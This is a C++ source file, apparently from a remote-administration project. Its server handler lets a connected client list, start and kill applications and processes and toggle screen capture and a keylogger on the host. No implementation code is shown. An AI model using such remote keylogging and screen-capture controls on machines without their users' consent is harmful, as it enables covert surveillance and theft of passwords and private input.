#include "ServerBackend.h"

void ServerBackend::handleClientRequest(std::shared_ptr<DataObj> data)
{

    switch (data->getFuncType())
    {
    case IAP:
        if (data->getCmdType() == SHOW)
        {
            data = _IAPfunc.listApps();
        }
        else if (data->getCmdType() == START)
        {
            std::string appName = data->getData_String();
            data = _IAPfunc.startApp(appName);
        }
        else
        {
            std::string appName = data->getData_String();
            data = _IAPfunc.stopApp(appName);
        }
        break;
    case RPC:
        if (data->getCmdType() == SHOW)
        {
            data = _RPCfunc.listPrcs();
        }
        else if (data->getCmdType() == START)
        {
            std::string prcName = data->getData_String();
            data = _RPCfunc.runPrc(prcName);
        }
        else
        {
            std::string prcName = data->getData_String();
            data = _RPCfunc.killPrc(prcName);
        }
        break;
    case SCR:
        if (data->getCmdType() == START)
        {
            data = _SCRfunc.startCapture();
        }
        else
        {
            data = _SCRfunc.stopCapture();
        }
        break;
    case KLG:
        if (data->getCmdType() == START)
        {
            data = _KLGfunc.startKeylog();
        }
        else
        {
            data = _KLGfunc.stopKeylog();
        }
        break;
    case DIR:
        //data = _DIRfunc.HandleRequest();
        break;

    default:
        break;
    }
}
